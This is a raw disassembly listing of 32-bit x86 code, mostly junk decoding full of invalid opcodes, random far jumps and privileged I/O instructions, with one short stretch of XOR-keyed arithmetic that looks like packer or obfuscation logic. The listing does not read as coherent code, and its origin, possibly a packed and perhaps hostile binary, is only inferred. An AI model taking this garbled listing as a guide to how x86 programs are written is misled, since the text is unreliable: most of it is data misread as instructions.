  416cb1:	out    0x3f,al
  416cb3:	mov    ch,0xc9
  416cb5:	out    0xab,eax
  416cb7:	mov    cl,0xc8
  416cb9:	loop   0x416c61
  416cbb:	in     eax,0xe6
  416cbd:	mov    eax,0xdd432d98
  416cc2:	(bad)  
  416cc3:	aam    0x41
  416cc5:	push   cs
  416cc6:	ins    BYTE PTR es:[edi],dx
  416cc7:	adc    BYTE PTR [edx+0x25972656],0x93
  416cce:	adc    al,0x7c
  416cd0:	cmp    al,0xa
  416cd2:	repz imul esi,ecx,0x12271d64
  416cd9:	adc    eax,0x237798de
  416cde:	and    eax,DWORD PTR [edi-0x5ee19334]
  416ce4:	pop    ebx
  416ce5:	xchg   esi,eax
  416ce6:	push   ecx
  416ce7:	and    DWORD PTR [ebx],0x27
  416cea:	pop    es
  416ceb:	jb     0x416d38
  416ced:	mov    esp,edi
  416cef:	mov    ch,0x3
  416cf1:	rol    DWORD PTR ds:0x4048e1b9,cl
  416cf7:	push   edx
  416cf8:	or     DWORD PTR [edx],ebx
  416cfa:	data16 jo 0x416c89
  416cfd:	inc    edi
  416cfe:	sub    DWORD PTR [eax-0x78],0x46b591ac
  416d05:	mov    ecx,0x662470fd
  416d0a:	mov    cl,BYTE PTR [ebp+0x384c162c]
  416d10:	fwait
  416d11:	or     al,0x43
  416d13:	mov    esp,0x99a985a1
  416d18:	xor    DWORD PTR ds:0x6cd177ec,ebx
  416d1e:	stos   DWORD PTR es:[edi],eax
  416d1f:	stos   DWORD PTR es:[edi],eax
  416d20:	add    eax,0xf7bb84c8
  416d25:	or     BYTE PTR [eax],dh
  416d27:	loop   0x416d35
  416d29:	pop    esi
  416d2a:	pusha  
  416d2b:	cmp    ebp,DWORD PTR [esi+edi*1]
  416d2e:	arpl   WORD PTR [ebx],sp
  416d30:	sbb    eax,DWORD PTR [ecx]
  416d32:	test   ch,ah
  416d34:	outs   dx,BYTE PTR ds:[esi]
  416d35:	jmp    0xfa0c:0x24738425
  416d3c:	(bad)  
  416d3d:	lds    ebp,FWORD PTR [ebx+0x75cb6eb9]
  416d43:	push   eax
  416d44:	cmp    eax,0x21787b59
  416d49:	dec    edi
  416d4a:	mov    esi,DWORD PTR [ebx-0x5d3a1f55]
  416d50:	xor    ah,al
  416d52:	pop    ebp
  416d53:	add    DWORD PTR [edi-0x17],0x25
  416d57:	fcmovu st,st(5)
  416d59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d5a:	mov    ds:0x2fcbb58e,al
  416d5f:	fdiv   QWORD PTR [eax+eiz*8]
  416d62:	mov    esi,0xad0fb831
  416d67:	pop    ecx
  416d68:	or     al,0x49
  416d6a:	mov    bl,0x9e
  416d6c:	js     0xd77a599
  416d72:	int3   
  416d73:	pusha  
  416d74:	enter  0x2d36,0x7e
  416d78:	dec    ebx
  416d79:	outs   dx,BYTE PTR ds:[esi]
  416d7a:	leave  
  416d7b:	ins    BYTE PTR es:[edi],dx
  416d7c:	and    esp,esp
  416d7e:	call   0x9a32:0x6ab2e824
  416d85:	call   0x1dd9:0xd9f46d49
  416d8c:	push   0x3d4ee137
  416d91:	ins    BYTE PTR es:[edi],dx
  416d92:	add    BYTE PTR [esi-0x1b1ad2ab],0xc7
  416d99:	sti    
  416d9a:	and    ebp,ebx
  416d9c:	xchg   edi,eax
  416d9d:	jno    0x416d66
  416d9f:	inc    esi
  416da0:	clc    
  416da1:	mov    BYTE PTR [eax+eiz*4-0x22],bl
  416da5:	sub    BYTE PTR ds:0x8c1090e7,bl
  416dab:	or     eax,0x8b736497
  416db0:	adc    edi,DWORD PTR [esi-0x615c754d]
  416db6:	xchg   ebp,eax
  416db7:	add    dh,dh
  416db9:	add    eax,0x9b465a47
  416dbe:	add    al,0x67
  416dc0:	je     0x416ddb
  416dc2:	fsubr  QWORD PTR [edx+0x6c]
  416dc5:	fdivr  QWORD PTR [eax+ebp*2-0x381cce3]
  416dcc:	inc    edi
  416dcd:	in     eax,dx
  416dce:	stc    
  416dcf:	adc    ah,BYTE PTR [edx+0x29]
  416dd2:	scas   eax,DWORD PTR es:[edi]
  416dd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dd4:	stc    
  416dd5:	fsubr  st,st(4)
  416dd7:	adc    ebx,DWORD PTR [edx-0x59]
  416dda:	mov    eax,ds:0xdc6f5563
  416ddf:	data16 repz add BYTE PTR [ebp+0xb],bl
  416de4:	ss mov dh,0xa0
  416de7:	jecxz  0x416e1b
  416de9:	scas   eax,DWORD PTR es:[edi]
  416dea:	or     DWORD PTR [ebp+ebx*1+0x3d63303],ebx
  416df1:	mov    DWORD PTR [ebx],0xc2af0fd7
  416df7:	add    eax,DWORD PTR [ebp-0xc]
  416dfa:	mov    DWORD PTR [ebp-0xc],eax
  416dfd:	mov    eax,DWORD PTR [ebp-0xc]
  416e00:	mov    edx,DWORD PTR [ebp-0x20]
  416e03:	sub    eax,edi
  416e05:	sub    edx,edi
  416e07:	xor    eax,esi
  416e09:	xor    edx,esi
  416e0b:	cmp    edx,eax
  416e0d:	jne    0x4102d1
  416e13:	mov    eax,DWORD PTR [ebp-0x1c]
  416e16:	mov    edx,DWORD PTR [ebp-0x20]
  416e19:	xor    eax,esi
  416e1b:	add    eax,edi
  416e1d:	imul   eax,edx
  416e20:	mov    edx,DWORD PTR [ebp-0x24]
  416e23:	xor    edx,esi
  416e25:	add    edx,edi
  416e27:	or     eax,edx
  416e29:	mov    edx,DWORD PTR [ebp-0x18]
  416e2c:	xor    edx,esi
  416e2e:	add    eax,edx
  416e30:	mov    edx,DWORD PTR [ebp-0x18]
  416e33:	xor    edx,esi
  416e35:	add    eax,edx
  416e37:	mov    edx,DWORD PTR [ebp-0x10]
  416e3a:	lea    eax,[eax+edx*1+0x64e5b6]
  416e41:	jmp    0x4191ca
  416e46:	jmp    0x4191bb
  416e4b:	push   ebx
  416e4c:	ja     0x416e99
  416e4e:	cmp    BYTE PTR [ebx],ch
  416e50:	add    al,0xe3
  416e52:	adc    esp,ebp
  416e54:	xchg   edx,eax
  416e55:	push   edx
  416e56:	mov    al,0xf8
  416e58:	sbb    esi,DWORD PTR [edx-0x10]
  416e5b:	mov    bh,0x24
  416e5d:	popa   
  416e5e:	bound  ecx,QWORD PTR [edx]
  416e60:	pop    edi
  416e61:	bound  esp,QWORD PTR [edx+0x1f]
  416e64:	xor    dl,BYTE PTR [esi+0xb]
  416e67:	pop    eax
  416e68:	je     0x416eab
  416e6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e6b:	and    dh,BYTE PTR [esi-0x2ee09070]
  416e71:	pop    ebx
  416e72:	(bad)  
  416e73:	and    DWORD PTR [esi+0x1bb32fd1],ebx
  416e79:	mov    eax,0x21a9c677
  416e7e:	mov    dh,0xf0
  416e80:	inc    esi
  416e81:	fucomp st(6)
  416e83:	mov    WORD PTR [esi+0x15],es
  416e86:	push   0xffffffbe
  416e88:	jmp    DWORD PTR [edx-0x58d7d757]
  416e8e:	fistp  DWORD PTR [ebp-0x4a]
  416e91:	ror    DWORD PTR [ecx],cl
  416e93:	hlt    
  416e94:	mov    dh,0x38
  416e96:	fcomp  DWORD PTR [edi]
  416e98:	push   es
  416e99:	cli    
  416e9a:	in     al,dx
  416e9b:	mov    DWORD PTR [ecx],edx
  416e9d:	push   cs
  416e9e:	push   es
  416e9f:	(bad)  
  416ea2:	xchg   esp,eax
  416ea3:	dec    ebx
  416ea4:	push   edx
  416ea5:	fsub   st(2),st
  416ea7:	adc    DWORD PTR [eax-0x1c],0xffffff83
  416eab:	loope  0x416f16
  416ead:	push   0x3c
  416eaf:	or     bh,bl
  416eb1:	push   cs
  416eb2:	jmp    0xb088:0x65211a8
  416eb9:	dec    edi
  416eba:	push   esp
  416ebb:	adc    BYTE PTR [edi],bl
  416ebd:	leave  
  416ebe:	pop    esi
  416ebf:	dec    ebx
  416ec0:	push   0x21d9bedb
  416ec5:	aaa    
  416ec6:	mov    BYTE PTR [eax],0x44
  416ec9:	ins    BYTE PTR es:[edi],dx
  416eca:	inc    eax
  416ecb:	fidiv  WORD PTR [ebx]
  416ecd:	jecxz  0x416f15
  416ecf:	jbe    0x416eb9
  416ed1:	push   edi
  416ed2:	sbb    al,0x5
  416ed4:	add    al,0xc5
  416ed6:	push   ebx
  416ed7:	and    BYTE PTR [edi+0x17],bh
  416eda:	in     al,dx
  416edb:	xor    edi,edx
  416edd:	in     eax,dx
  416ede:	mov    ecx,0x5562e001
  416ee3:	xor    ecx,DWORD PTR [esi+0x18f4ea6c]
  416ee9:	mov    ebp,0x4bddd43b
  416eee:	mov    bl,0xf1
  416ef0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ef1:	cmp    ebx,DWORD PTR [edi+0x2587fd36]
  416ef7:	xlat   BYTE PTR ds:[ebx]
  416ef8:	pop    edi
  416ef9:	xchg   ebp,eax
  416efa:	or     al,0xcb
  416efc:	add    ch,bl
  416efe:	cmp    ebx,ecx
  416f00:	sbb    bh,BYTE PTR [esi-0x62e8e55b]
  416f06:	mov    dh,0x71
  416f08:	jae    0x416ec5
  416f0a:	ficom  DWORD PTR ds:0x4223640a
  416f10:	arpl   WORD PTR [ebx],cx
  416f12:	and    bl,ch
  416f14:	arpl   WORD PTR [ebx],ax
  416f16:	jecxz  0x416eb6
  416f18:	cmc    
  416f19:	and    dl,BYTE PTR [ecx+esi*1]
  416f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f1d:	retf   0x2ea8
  416f20:	call   0x80:0xadb90dce
  416f27:	test   BYTE PTR [eax],dh
  416f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f2a:	sbb    BYTE PTR [esi+0xd38f36a],0x3a
  416f31:	sti    
  416f32:	les    ecx,FWORD PTR [ebx+0x14]
  416f35:	push   eax
  416f36:	out    0x40,al
  416f38:	and    al,0x9f
  416f3a:	(bad)  
  416f3b:	and    eax,0x504804bb
  416f40:	xchg   edx,eax
  416f41:	scas   al,BYTE PTR es:[edi]
  416f42:	jmp    0x49b7:0x82a20c74
  416f49:	jmp    0xe6fd:0x44205eea
  416f50:	(bad)  
  416f51:	jmp    0x3fc8:0x64d02dd5
  416f58:	cmp    BYTE PTR [esi+0x17],dh
  416f5b:	fwait
  416f5c:	aad    0x82
  416f5e:	retf   0x7976
  416f61:	inc    ecx
  416f62:	mov    ss,esp
  416f64:	jecxz  0x416f42
  416f66:	repz icebp 
  416f68:	jnp    0x416fcf
  416f6a:	or     dh,BYTE PTR [ebx+eax*8-0x6c]
  416f6e:	jecxz  0x416f75
  416f70:	push   ss
  416f71:	iret   
  416f72:	mov    eax,0x8cd47fb5
  416f77:	mov    edx,ebp
  416f79:	iret   
  416f7a:	mov    esi,0xaeb5423e
  416f7f:	jle    0x416ffc
  416f81:	jmp    0x416f2e
  416f83:	or     BYTE PTR [ecx],ah
  416f85:	push   ebp
  416f86:	(bad)  
  416f87:	jle    0x416f80
  416f89:	loop   0x416fe1
  416f8b:	push   es
  416f8c:	and    cl,BYTE PTR [ecx+ebx*2-0x6f]
  416f90:	dec    esp
  416f91:	cmp    DWORD PTR [ecx+0x2f],esp
  416f94:	lahf   
  416f95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f96:	mov    DWORD PTR ds:0xd2ae319f,ecx
  416f9c:	dec    ebx
  416f9d:	xchg   ebp,eax
  416f9e:	int    0xe8
  416fa0:	js     0x41700e
  416fa2:	into   
  416fa3:	mov    ds,ebp
  416fa5:	sbb    al,0x1
  416fa7:	in     al,0x65
  416fa9:	cdq    
  416faa:	and    al,0xa1
  416fac:	adc    al,0x1d
  416fae:	sbb    eax,0xab89372a
  416fb3:	test   edi,ecx
  416fb5:	out    0x72,eax
  416fb7:	pop    ebp
  416fb8:	mov    ebp,0x75adfe57
  416fbd:	icebp  
  416fbe:	jmp    0x95fc4bae
  416fc3:	leave  
  416fc4:	fistp  WORD PTR [ebx-0x4e]
  416fc7:	ins    BYTE PTR es:[edi],dx
  416fc8:	loope  0x416ffc
  416fca:	mov    ch,ch
  416fcc:	mov    WORD PTR [edi],fs
  416fce:	ja     0x417030
  416fd0:	adc    BYTE PTR [ebx+0x63f16c32],ch
  416fd6:	adc    cl,ah
  416fd8:	mov    al,ds:0x7b917907
  416fdd:	data16 or al,0xf1
  416fe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fe1:	fild   DWORD PTR [edi+0x69fc2821]
  416fe7:	and    al,0x4e
  416fe9:	loope  0x416fa0
  416feb:	xchg   edi,eax
  416fec:	out    0xf2,eax
  416fee:	scas   eax,DWORD PTR es:[edi]
  416fef:	and    DWORD PTR [edi],ecx
  416ff1:	gs mov ch,0x90
  416ff4:	in     al,dx
  416ff5:	leave  
  416ff6:	push   ebp
  416ff7:	sub    ebp,edi
  416ff9:	sub    dl,al
  416ffb:	popf   
  416ffc:	dec    esi
  416ffd:	and    cl,BYTE PTR [ebx+0x37]
  417000:	pop    ebp
  417001:	popf   
  417002:	push   ds
  417003:	lock jmp 0xd61a4d4e
  417009:	cmp    DWORD PTR [ebp-0x5b],ecx
  41700c:	loopne 0x417078
  41700e:	push   eax
  41700f:	loope  0x41707c
  417011:	aam    0xc3
  417013:	and    ebp,DWORD PTR [edi-0x5621128b]
  417019:	xchg   esi,eax
  41701a:	push   edi
  41701b:	ds pop eax
  41701d:	cld    
  41701e:	xchg   ebx,eax
  41701f:	daa    
  417020:	clc    
  417021:	jbe    0x416fa5
  417023:	repz jno 0x416ffb
  417026:	call   0xb3b:0x40d9aa5b
  41702d:	lods   al,BYTE PTR ds:[esi]
  41702e:	push   ss
  41702f:	mov    ebx,0x57cda003
  417034:	xchg   esi,eax
  417035:	and    edx,esi
  417037:	mov    esp,0x5cca0f24
  41703c:	lods   eax,DWORD PTR ds:[esi]
  41703d:	ror    BYTE PTR [esi],cl
  41703f:	xor    bl,BYTE PTR [ecx-0x2d4ce7ce]
  417045:	cmp    ebp,ebx
  417047:	fdivr  st(7),st
  417049:	(bad)  
  41704b:	xor    cl,al
  41704d:	gs aad 0x1b
  417050:	pop    ecx
  417051:	jmp    0xe804aa9
  417056:	or     eax,edx
  417058:	xchg   DWORD PTR [esi+0x34194844],edi
  41705e:	mov    ds,WORD PTR [esi]
  417060:	mov    dh,0x2c
  417062:	(bad)  
  417063:	cs jecxz 0x417075
  417066:	and    eax,0x81b25f3b
  41706b:	and    DWORD PTR [ecx+0x4a],ebp
  41706e:	stos   DWORD PTR es:[edi],eax
  41706f:	loopne 0x417036
  417071:	mov    cl,0xf8
  417073:	pop    ds
  417074:	adc    ch,BYTE PTR [ecx-0x52]
  417077:	push   ebp
  417078:	stc    
  417079:	push   edx
  41707a:	sbb    eax,0xb8956931
  41707f:	daa    
  417080:	push   ecx
  417081:	or     BYTE PTR [ecx+0x67],bl
  417084:	scas   al,BYTE PTR es:[edi]
  417085:	inc    ecx
  417086:	mov    esp,0x88f66dc4
  41708b:	push   eax
  41708c:	mov    eax,0x95f4c2e8
  417091:	enter  0xb7ad,0x2b
  417095:	out    dx,eax
  417096:	ficom  WORD PTR [ebx]
  417098:	out    dx,al
  417099:	clc    
  41709a:	add    eax,0x5a51e6bf
  41709f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170a0:	fnstenv ds:0xc7acbdb0
  4170a6:	jb     0x4170ce
  4170a8:	cmp    BYTE PTR [ebx+0x43],dh
  4170ab:	jno    0x417054
  4170ad:	mov    bh,0xb6
  4170af:	data16 loopne 0x417084
  4170b2:	add    bh,dh
  4170b4:	xor    dl,bl
  4170b6:	into   
  4170b7:	push   eax
  4170b8:	mov    edx,0xbd2914d2
  4170bd:	imul   esi,DWORD PTR [ecx-0x6a0352a7],0xffffff9d
  4170c4:	rcl    BYTE PTR [ebp-0x3a090296],1
  4170ca:	xor    edx,ecx
  4170cc:	ins    DWORD PTR es:[edi],dx
  4170cd:	dec    ebp
  4170ce:	fcmovnbe st,st(1)
  4170d0:	aas    
  4170d1:	in     al,dx
  4170d2:	jge    0x4170fb
  4170d4:	mov    esi,0x5697370a
  4170d9:	mov    ebx,0xfa91c4fb
  4170de:	aaa    
  4170df:	jecxz  0x4170f1
  4170e1:	dec    ebp
  4170e2:	and    esp,edx
  4170e4:	popa   
  4170e5:	and    dl,BYTE PTR [ebx+0x67374b43]
  4170eb:	jne    0x4170ae
  4170ed:	cmp    al,0xd4
  4170f0:	pop    ecx
  4170f1:	jecxz  0x41715a
  4170f3:	mov    dl,0xe9
  4170f5:	(bad)  
  4170f6:	gs pop ebx
  4170f8:	in     al,dx
  4170f9:	pushf  
  4170fa:	cmp    BYTE PTR [esi+0x36],cl
  4170fd:	pop    edx
  4170fe:	xchg   edx,eax
  4170ff:	outs   dx,BYTE PTR ds:[esi]
  417100:	jle    0x4170ae
  417102:	retf   
  417103:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417104:	jl     0x417156
  417106:	shl    DWORD PTR [ebx-0x5f],cl
  417109:	dec    esi
  41710a:	jmp    0x3136:0x3af2dc07
  417111:	mov    ch,0xd5
  417113:	and    ebx,edx
  417115:	retf   
  417116:	cs pop esi
  417118:	jae    0x4170e4
  41711a:	int    0x4c
  41711c:	jbe    0x4170af
  41711e:	(bad)  
  41711f:	iret   
  417120:	aas    
  417121:	mov    eax,ds:0x1f463126
  417126:	mov    DWORD PTR [edi],edi
  417128:	cmc    
  417129:	inc    ebp
  41712a:	adc    cl,dl
  41712c:	push   0x1adf0841
  417131:	add    BYTE PTR [edx+0x54],dl
  417134:	cmp    ecx,DWORD PTR [edi]
  417136:	mov    edx,0x5264c08f
  41713b:	les    ebp,FWORD PTR [ebp+0x5b]
  41713e:	sub    ch,BYTE PTR [edi]
  417140:	add    esp,DWORD PTR [ebx+0x18bb4623]
  417146:	sbb    eax,0xcf74ddb5
  41714b:	pusha  
  41714c:	in     al,0x95
  41714e:	adc    DWORD PTR [esi-0x50e3ea0b],ecx
  417154:	bswap  di
  417157:	jne    0x4170f3
  417159:	mov    bl,0x49
  41715b:	lods   eax,DWORD PTR ds:[esi]
  41715c:	add    al,BYTE PTR [ebx-0x6d]
  41715f:	jge    0x417127
  417161:	mov    bh,0xb2
  417163:	frstor [edx-0x66]
  417166:	leave  
  417167:	fisub  DWORD PTR [esi-0x65]
  41716a:	iret   
  41716b:	out    0xdf,eax
  41716d:	jb     0x4171a7
  41716f:	mov    WORD PTR [esp+esi*4],es
  417172:	mov    al,0x4e
  417174:	add    ecx,DWORD PTR [edi-0x2ef8727a]
  41717a:	xchg   DWORD PTR [eax-0x4b],ebx
  41717d:	cdq    
  41717e:	dec    esi
  41717f:	in     al,dx
  417180:	add    dl,bl
  417182:	cdq    
  417183:	and    ch,BYTE PTR ds:0xdcb8fb84
  417189:	aaa    
  41718a:	push   0xff737ab8
  41718f:	mov    ebp,0x6b3e0670
  417194:	jp     0x417202
  417196:	inc    edx
  417197:	xchg   esp,eax
  417198:	dec    ecx
  417199:	(bad)  
  41719a:	lods   al,BYTE PTR ds:[esi]
  41719b:	stc    
  41719c:	or     DWORD PTR [edi],0xffffff85
  41719f:	sbb    ebp,DWORD PTR [edx-0x1c]
  4171a2:	jecxz  0x417154
  4171a4:	int    0xfd
  4171a6:	outs   dx,DWORD PTR ds:[esi]
  4171a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171a8:	xchg   ebx,eax
  4171a9:	add    al,0x39
  4171ac:	lods   al,BYTE PTR ds:[esi]
  4171ad:	mov    bh,0x24
  4171af:	pop    esp
  4171b0:	(bad)  
  4171b2:	sti    
  4171b3:	jne    0x4171dc
  4171b5:	inc    ebx
  4171b6:	inc    esi
  4171b7:	mov    dl,dl
  4171b9:	add    dl,bh
  4171bb:	cmc    
  4171bc:	mov    al,0x18
  4171be:	popf   
  4171bf:	pushf  
  4171c0:	js     0x41722a
  4171c2:	sub    edi,ecx
  4171c4:	add    eax,0xef67e742
  4171c9:	sub    DWORD PTR [ebx],edx
  4171cb:	or     DWORD PTR [ebp+0x4d],eax
  4171ce:	test   BYTE PTR [esi],cl
  4171d0:	jmp    0xdcc33b86
  4171d5:	cdq    
  4171d6:	sbb    BYTE PTR [eax+0x15d632ee],dl
  4171dc:	sti    
  4171dd:	mov    bl,0x99
  4171df:	fimul  WORD PTR [ebp-0x31]
  4171e2:	cs xchg edx,eax
  4171e4:	imul   ebx,eax,0x2a
  4171e7:	inc    esp
  4171e8:	js     0x417177
  4171ea:	push   eax
  4171eb:	mov    dl,0x5
  4171ed:	in     eax,dx
  4171ee:	pop    eax
  4171ef:	inc    esi
  4171f0:	fistp  DWORD PTR [edi]
  4171f2:	inc    ebx
  4171f4:	cmp    al,0x30
  4171f6:	or     dl,BYTE PTR [eax+0x7c]
  4171f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171fa:	and    al,0x83
  4171fc:	test   esp,eax
  4171fe:	mov    bl,0x2b
  417200:	out    dx,eax
  417201:	fdivr  DWORD PTR [esi-0x15ca6cab]
  417207:	mov    edi,0x26e56acf
  41720c:	loope  0x41724e
  41720e:	fbld   TBYTE PTR [esi-0x27715b36]
  417214:	mov    bh,dl
  417216:	jmp    DWORD PTR [esi+0x1f8acf3d]
  41721c:	cmp    ecx,DWORD PTR [edi+0x7872f79a]
  417222:	jbe    0x417202
  417224:	icebp  
  417225:	xchg   DWORD PTR [edx-0x62],esp
  417228:	icebp  
  417229:	jbe    0x417213
  41722b:	mov    eax,ds:0x287421c3
  417230:	sub    eax,0xe1b15026
  417235:	test   al,0x9e
  417237:	(bad)  [eax+0x2a]
  41723a:	bound  ecx,QWORD PTR [ecx]
  41723c:	sar    BYTE PTR [edi-0x4bfcc62b],1
  417242:	cmp    dl,bh
  417244:	ins    BYTE PTR es:[edi],dx
  417245:	inc    ecx
  417246:	xor    ch,bh
  417248:	xor    al,0xc7
  41724a:	sub    BYTE PTR [esi],dl
  41724c:	ins    DWORD PTR es:[edi],dx
  41724d:	and    al,0xd7
  41724f:	jnp    0x417279
  417251:	adc    al,0xb2
  417253:	cs and ch,al
  417256:	fisttp QWORD PTR [esi]
  417258:	dec    esi
  417259:	adc    cl,dh
  41725b:	pop    ebx
  41725c:	test   BYTE PTR ds:0xb7fa6c32,ah
  417262:	std    
  417263:	test   al,ah
  417265:	test   al,0x32
  417267:	inc    edi
  417268:	or     DWORD PTR [ecx+0x19b8935e],eax
  41726e:	fisttp DWORD PTR [ecx+0x75169173]
  417274:	xor    BYTE PTR [ebx-0x8],dh
  417277:	cmp    edi,DWORD PTR [esp+esi*1+0x57]
  41727b:	inc    ebp
  41727c:	mov    edi,0xe0d6614f
  417281:	mov    ds:0x2775c48e,al
  417286:	aam    0xd3
  417288:	mov    esp,0x5dd122e4
  41728d:	enter  0xfce5,0x60
  417291:	scas   al,BYTE PTR es:[edi]
  417292:	loopne 0x417221
  417294:	call   0xac0e161a
  417299:	jp     0x417308
  41729b:	das    
  41729c:	out    dx,al
  41729d:	push   cs
  41729e:	jnp    0x41727c
  4172a0:	stc    
  4172a1:	daa    
  4172a2:	add    eax,0x86284c4f
  4172a7:	pushf  
  4172a8:	je     0x4172f0
  4172aa:	repnz xor ch,BYTE PTR [esi]
  4172ad:	loope  0x4172b1
  4172af:	mov    al,0xf6
  4172b1:	test   DWORD PTR [ebx],esi
  4172b3:	mov    eax,cs:0xdf539b5a
  4172b9:	test   al,0x2
  4172bb:	jo     0x417266
  4172bd:	adc    eax,0x256189c1
  4172c2:	gs or  al,0x56
  4172c5:	inc    ebx
  4172c6:	and    eax,0x7d4fc7b1
  4172cb:	inc    eax
  4172cc:	add    BYTE PTR [eax],ah
  4172ce:	pop    esp
  4172cf:	test   al,0x57
  4172d1:	cmc    
  4172d2:	sub    DWORD PTR [ecx-0x2d],0x48
  4172d6:	xchg   esp,eax
  4172d7:	or     al,0x89
  4172d9:	sub    al,0xa0
  4172db:	pop    ss
  4172dc:	aaa    
  4172dd:	std    
  4172de:	inc    ecx
  4172df:	cli    
  4172e0:	dec    esp
  4172e1:	xchg   ebp,eax
  4172e2:	imul   edx,DWORD PTR [esi+0x5c],0x53b6cdcc
  4172e9:	out    dx,al
  4172ea:	inc    ebp
  4172eb:	mov    bh,0x75
  4172ed:	inc    edx
  4172ee:	sbb    dh,BYTE PTR [ebp+esi*2-0x2a]
  4172f2:	xchg   ebp,eax
  4172f3:	loop   0x417364
  4172f5:	xor    DWORD PTR [ecx],eax
  4172f7:	div    DWORD PTR [eax]
  4172f9:	imul   BYTE PTR [edx-0x1d]
  4172fc:	inc    ebx
  4172fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172fe:	jae    0x4172aa
  417300:	mov    dl,0x98
  417302:	bnd jg 0x417317
  417305:	iret   
  417306:	adc    al,0x48
  417308:	mov    ah,0x6f
  41730a:	(bad)  
  41730b:	int3   
  41730c:	add    eax,0x93b8e685
  417311:	ins    DWORD PTR es:[edi],dx
  417312:	jl     0xa5af27b
  417318:	sub    esi,DWORD PTR [edx-0x1a]
  41731b:	int3   
  41731c:	iret   
  41731d:	pushf  
  41731e:	in     al,0xb7
  417320:	and    al,0xba
  417322:	ds inc ebp
  417324:	fild   QWORD PTR [eax+0x59]
  417327:	in     al,dx
  417328:	xchg   ebp,eax
  417329:	dec    edx
  41732a:	std    
  41732b:	ss nop
  41732d:	arpl   ax,si
  41732f:	jp     0x417326
  417331:	xor    bl,bl
  417333:	jb     0x4172ba
  417335:	repz or eax,0xf0547259
  41733b:	add    dl,BYTE PTR [esi]
  41733d:	push   es
  41733e:	repnz pop esp
  417340:	jbe    0x417302
  417342:	and    DWORD PTR [edi+ebx*8+0x6],edx
  417346:	xor    eax,0xbd00b418
  41734b:	dec    edi
  41734c:	inc    eax
  41734d:	fs push es
  41734f:	or     ebx,DWORD PTR [ebx-0x28]
  417352:	ins    BYTE PTR es:[edi],dx
  417353:	mov    ch,0xfc
  417355:	adc    BYTE PTR [edx-0x29875a57],al
  41735b:	and    eax,DWORD PTR ds:[ebp+0x1927087a]
  417362:	(bad)  
  417363:	adc    edi,eax
  417365:	sub    eax,DWORD PTR [edx]
  417367:	push   edx
  417368:	jmp    0xbdc76ef4
  41736d:	test   al,0x35
  41736f:	clc    
  417370:	test   eax,0xb5bc5dd7
  417375:	lods   al,BYTE PTR ds:[esi]
  417376:	push   ebp
  417377:	and    ch,BYTE PTR [ebx]
  417379:	push   ds
  41737a:	dec    esi
  41737b:	out    dx,al
  41737c:	pop    edx
  41737d:	dec    ecx
  41737e:	xor    eax,0xef662383
  417383:	inc    eax
  417384:	lods   al,BYTE PTR ds:[esi]
  417385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417386:	retf   
  417387:	push   0x7d
  417389:	mov    edx,0x6895ada8
  41738e:	pop    ebp
  41738f:	cmp    ah,al
  417391:	and    ch,BYTE PTR [ecx-0x37]
  417394:	es cs pop ds
  417397:	mov    eax,0xf52766e1
  41739c:	pusha  
  41739d:	mov    ds:0xc961235a,al
  4173a2:	ret    0xff
  4173a5:	daa    
  4173a6:	clc    
  4173a7:	aam    0x61
  4173a9:	sub    al,0xb
  4173ab:	push   ecx
  4173ac:	repnz and BYTE PTR [edi-0x2b],dl
  4173b0:	xchg   edi,eax
  4173b1:	shr    DWORD PTR [ebx+0x11],1
  4173b4:	js     0x417394
  4173b6:	scas   al,BYTE PTR es:[edi]
  4173b7:	xchg   BYTE PTR [ecx+0x49],ch
  4173ba:	xor    al,0x96
  4173bc:	inc    edi
  4173bd:	ins    DWORD PTR es:[edi],dx
  4173be:	icebp  
  4173bf:	dec    edx
  4173c0:	jae    0x41738b
  4173c2:	adc    esi,DWORD PTR [ebp-0x1]
  4173c5:	adc    ebp,ebx
  4173c7:	xor    ecx,DWORD PTR [ecx-0x5d10252a]
  4173cd:	ficomp DWORD PTR [ebx+0x4]
  4173d0:	mov    esi,0x4867be5d
  4173d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173d6:	jns    0x4173b1
  4173d8:	loopne 0x4173c4
  4173da:	xchg   WORD PTR [ebp+0x13884bf],cx
  4173e1:	xchg   esi,eax
  4173e2:	dec    DWORD PTR [ebx+0x29]
  4173e5:	out    dx,eax
  4173e6:	or     al,0xdd
  4173e8:	stos   DWORD PTR es:[edi],eax
  4173e9:	iret   
  4173ea:	sub    ebp,ebp
  4173ec:	xchg   ebx,eax
  4173ed:	movups xmm4,XMMWORD PTR [esi-0x6a]
  4173f1:	pop    esp
  4173f2:	cdq    
  4173f3:	sbb    DWORD PTR [esp+ebx*8-0x15],ecx
  4173f7:	loopne 0x4173f1
  4173f9:	sbb    al,0xe5
  4173fb:	ins    BYTE PTR es:[edi],dx
  4173fc:	add    al,0x2c
  4173fe:	xor    dh,BYTE PTR [edi]
  417400:	inc    ebx
  417401:	rcl    bl,0xfd
  417404:	arpl   di,dx
  417406:	dec    ebp
  417407:	das    
  417408:	push   es
  417409:	mov    ch,BYTE PTR [eax+0x1c]
  41740c:	sub    DWORD PTR [ebp-0x345217ba],ecx
  417412:	add    eax,0x369b74d1
  417417:	jmp    0x417452
  417419:	es mov dl,0x7b
  41741c:	jne    0x41746f
  41741e:	rcr    BYTE PTR [esi+0x3b96bc94],1
  417424:	mov    ds:0xd324e48e,al
  417429:	aam    0x97
  41742b:	push   ss
  41742c:	icebp  
  41742d:	pop    edi
  41742e:	push   ebx
  41742f:	cmp    ah,BYTE PTR [ebx-0x140b932]
  417435:	xchg   ebp,eax
  417436:	out    dx,eax
  417437:	xlat   BYTE PTR ds:[ebx]
  417438:	mov    ebx,0xb678692c
  41743d:	mov    edx,0x185c2ad3
  417442:	push   esp
